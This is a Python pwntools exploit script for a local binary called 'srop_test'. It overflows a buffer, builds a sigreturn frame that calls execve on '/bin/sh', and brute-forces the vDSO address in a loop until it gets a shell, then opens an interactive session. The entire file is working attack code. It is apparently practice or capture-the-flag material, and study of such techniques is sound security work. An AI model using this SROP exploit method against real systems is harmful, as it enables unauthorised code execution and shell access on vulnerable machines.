from pwn import *
import random

binsh_addr = 0x804a024
bss_addr = 0x804a02e
vdso_range = range(0xf7700000, 0xf7800000, 0x1000)

def main():
    global p
    debug = 1
    if debug:
        #context.level_log = "debug"
        context.arch = "i386"
        p = process('./srop_test')
    else:
        pass
    
    global vdso_addr
    vdso_addr = random.choice(vdso_range)
    payload = 'a' * 0x10c
    frame = SigreturnFrame(kernel = "i386")
    frame.eax = 0xb
    frame.ebx = binsh_addr
    frame.ecx = 0
    frame.edx = 0
    frame.eip = vdso_addr + 0x416  #address of int 80h
    frame.esp = bss_addr # whatever
    frame.ebp = bss_addr # whatever
    frame.gs = 0x63
    frame.cs = 0x23
    frame.es = 0x2b
    frame.ds = 0x2b
    frame.ss = 0x2b
    
    ret_addr = vdso_addr + 0x411  #address of sigreturn syscall
    
    #print payload
    
    payload += p32(ret_addr) + str(frame)
    p.recvuntil("input something you want: \n")
    p.sendline(payload)

    sleep(1)
    p.sendline("echo pwned!")
    r = p.recvuntil("pwned!")
    if r != "pwned!":
        raise Exception("Failed!")

    return

    

if __name__ == "__main__":
    global p, vdso_addr
    i = 1
    while True:
        print "\nTry %d" % i
        try:
            main()
        except:
            #print e
            p.close()
            i += 1
            continue
        print "vdso_addr: " + hex(vdso_addr)
        p.interactive()
        break
        
